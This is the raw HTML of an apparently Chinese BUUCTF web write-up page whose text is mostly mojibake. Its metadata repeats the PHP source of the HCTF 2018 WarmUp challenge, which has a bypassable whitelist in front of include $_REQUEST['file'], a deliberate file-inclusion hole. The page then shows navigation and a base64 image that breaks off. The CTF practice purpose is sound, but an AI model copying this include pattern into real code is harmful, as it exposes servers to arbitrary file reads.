<!doctype html><html lang=zh-cn dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="å¯’å‡æ¨ªå‘åˆ·é¢˜ï¼ˆå°½é‡ï¼‰ BUUCTF ğŸ’—ğŸ§¡ğŸ’›ğŸ’šğŸ’™ğŸ’œğŸ¤ğŸ–¤ğŸ¤ é¢˜éƒ½å†™è¿™ä¸€ä¸ªé‡Œé¢äº†ï¼Œå¯ä»¥å…ˆç”¨Ctrl+Fæœç´¢ï¼Œè¿˜æœ‰éƒ¨åˆ†æ˜¯è‰ç¨¿è¿˜æ²¡æœ‰æ•´ç†ï¼Œä¸è¿‡æˆ‘è®¤ä¸ºçš„æ€è·¯å·²ç»æ•´ç†å‡ºæ¥äº†ï¼Œçœ‹ä¸æ‡‚è¿˜è¯·å¤§ä¼™è§è°…ã€‚æœ‰é—®é¢˜äº†å¾ˆä¹æ„æ•ˆåŠ³ğŸ’¨\n2021.01.15 [HCTF 2018]WarmUp è¿›åˆ°é¶æœºä¸€ä¸ªç¡•å¤§çš„æ»‘ç¨½ï¼ŒæŸ¥çœ‹æºç æœ‰æç¤ºsource.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 <?php highlight_file(__FILE__); class emmm { public static function checkFile(&$page) { $whitelist = [&#34;source&#34;=>&#34;source.php&#34;,&#34;hint&#34;=>&#34;hint.php&#34;]; if (! isset($page) || !is_string($page)) { echo &#34;you can't see it&#34;; return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } echo &#34;you can't see it&#34;; return false; } } if (! empty($_REQUEST['file']) && is_string($_REQUEST['file']) && emmm::checkFile($_REQUEST['file']) ) { include $_REQUEST['file']; exit; } else { echo &#34;<br><img src=\\&#34;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&#34; />&#34;; } ?> å‘ç°ç™½åå•æœ‰source.phpå’Œhint.phpï¼Œå…ˆå»æŸ¥çœ‹ä¸€ä¸‹hint.php\n"><title>BUUCTFå¯’å‡åˆ·é¢˜-Web</title><link rel=canonical href=https://www.braindance.top/articles/2021/01/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/><link rel=stylesheet href=/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css><meta property='og:title' content="BUUCTFå¯’å‡åˆ·é¢˜-Web"><meta property='og:description' content="å¯’å‡æ¨ªå‘åˆ·é¢˜ï¼ˆå°½é‡ï¼‰ BUUCTF ğŸ’—ğŸ§¡ğŸ’›ğŸ’šğŸ’™ğŸ’œğŸ¤ğŸ–¤ğŸ¤ é¢˜éƒ½å†™è¿™ä¸€ä¸ªé‡Œé¢äº†ï¼Œå¯ä»¥å…ˆç”¨Ctrl+Fæœç´¢ï¼Œè¿˜æœ‰éƒ¨åˆ†æ˜¯è‰ç¨¿è¿˜æ²¡æœ‰æ•´ç†ï¼Œä¸è¿‡æˆ‘è®¤ä¸ºçš„æ€è·¯å·²ç»æ•´ç†å‡ºæ¥äº†ï¼Œçœ‹ä¸æ‡‚è¿˜è¯·å¤§ä¼™è§è°…ã€‚æœ‰é—®é¢˜äº†å¾ˆä¹æ„æ•ˆåŠ³ğŸ’¨\n2021.01.15 [HCTF 2018]WarmUp è¿›åˆ°é¶æœºä¸€ä¸ªç¡•å¤§çš„æ»‘ç¨½ï¼ŒæŸ¥çœ‹æºç æœ‰æç¤ºsource.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 <?php highlight_file(__FILE__); class emmm { public static function checkFile(&$page) { $whitelist = [&#34;source&#34;=>&#34;source.php&#34;,&#34;hint&#34;=>&#34;hint.php&#34;]; if (! isset($page) || !is_string($page)) { echo &#34;you can't see it&#34;; return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } echo &#34;you can't see it&#34;; return false; } } if (! empty($_REQUEST['file']) && is_string($_REQUEST['file']) && emmm::checkFile($_REQUEST['file']) ) { include $_REQUEST['file']; exit; } else { echo &#34;<br><img src=\\&#34;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&#34; />&#34;; } ?> å‘ç°ç™½åå•æœ‰source.phpå’Œhint.phpï¼Œå…ˆå»æŸ¥çœ‹ä¸€ä¸‹hint.php\n"><meta property='og:url' content='https://www.braindance.top/articles/2021/01/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/'><meta property='og:site_name' content='Braindance'><meta property='og:type' content='article'><meta property='article:section' content='Posts'><meta property='article:tag' content='web'><meta property='article:tag' content='BUUCTF_Web'><meta property='article:published_time' content='2021-01-18T16:58:56+00:00'><meta property='article:modified_time' content='2021-01-18T16:58:56+00:00'><meta name=twitter:title content="BUUCTFå¯’å‡åˆ·é¢˜-Web"><meta name=twitter:description content="å¯’å‡æ¨ªå‘åˆ·é¢˜ï¼ˆå°½é‡ï¼‰ BUUCTF ğŸ’—ğŸ§¡ğŸ’›ğŸ’šğŸ’™ğŸ’œğŸ¤ğŸ–¤ğŸ¤ é¢˜éƒ½å†™è¿™ä¸€ä¸ªé‡Œé¢äº†ï¼Œå¯ä»¥å…ˆç”¨Ctrl+Fæœç´¢ï¼Œè¿˜æœ‰éƒ¨åˆ†æ˜¯è‰ç¨¿è¿˜æ²¡æœ‰æ•´ç†ï¼Œä¸è¿‡æˆ‘è®¤ä¸ºçš„æ€è·¯å·²ç»æ•´ç†å‡ºæ¥äº†ï¼Œçœ‹ä¸æ‡‚è¿˜è¯·å¤§ä¼™è§è°…ã€‚æœ‰é—®é¢˜äº†å¾ˆä¹æ„æ•ˆåŠ³ğŸ’¨\n2021.01.15 [HCTF 2018]WarmUp è¿›åˆ°é¶æœºä¸€ä¸ªç¡•å¤§çš„æ»‘ç¨½ï¼ŒæŸ¥çœ‹æºç æœ‰æç¤ºsource.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 <?php highlight_file(__FILE__); class emmm { public static function checkFile(&$page) { $whitelist = [&#34;source&#34;=>&#34;source.php&#34;,&#34;hint&#34;=>&#34;hint.php&#34;]; if (! isset($page) || !is_string($page)) { echo &#34;you can't see it&#34;; return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } echo &#34;you can't see it&#34;; return false; } } if (! empty($_REQUEST['file']) && is_string($_REQUEST['file']) && emmm::checkFile($_REQUEST['file']) ) { include $_REQUEST['file']; exit; } else { echo &#34;<br><img src=\\&#34;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&#34; />&#34;; } ?> å‘ç°ç™½åå•æœ‰source.phpå’Œhint.phpï¼Œå…ˆå»æŸ¥çœ‹ä¸€ä¸‹hint.php\n"><link rel=alternate type=application/rss+xml href=https://www.braindance.top/articles/2021/01/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/index.xml><link rel=alternate type=application/json href=https://www.braindance.top/articles/2021/01/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/index.json><link rel="shortcut icon" href=/favicon.ico><script async src="https://www.googletagmanager.com/gtag/js?id=G-0CQLT1ENWK"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-0CQLT1ENWK")}</script></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=åˆ‡æ¢èœå•>
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_c3cbaf95bdb68a2d.png width=300 height=300 class=site-logo loading=lazy alt=Avatar>
</a><span class=emoji>ğŸ¥¸</span></figure><div class=site-meta><h1 class=site-name><a href=/>Braindance</a></h1><h2 class=site-description>å…´è¶£ä½¿ç„¶</h2></div></header><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li class=current><a href=/posts/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/tags/><svg class="icon icon-tabler icon-tabler-tag" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11 3l9 9a1.5 1.5.0 010 2l-6 6a1.5 1.5.0 01-2 0L3 11V7a4 4 0 014-4h4"/><circle cx="9" cy="9" r="2"/></svg>
<span>Tags</span></a></li><li><a href=/links/><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-friends"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 5M5 5a2 2 0 104 0A2 2 0 105 5"/><path d="M5 22v-5l-1-1v-4a1 1 0 011-1h4a1 1 0 011 1v4l-1 1v5"/><path d="M17 5m-2 0a2 2 0 104 0 2 2 0 10-4 0"/><path d="M15 22v-4h-2l2-6a1 1 0 011-1h2a1 1 0 011 1l2 6h-2v4"/></svg>
<span>Links</span></a></li><li><a href=https://www.travellings.cn/go.html target=_blank><!doctype html><svg id="Layer_1" xmlns:xlink="http://www.w3.org/1999/xlink" width="512" height="512" viewBox="0 0 512 512" enable-background="new 0 0 512 512"><image id="image0" width="512" height="512" x="0" y="0" xlink:href="data:image/png;base64,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 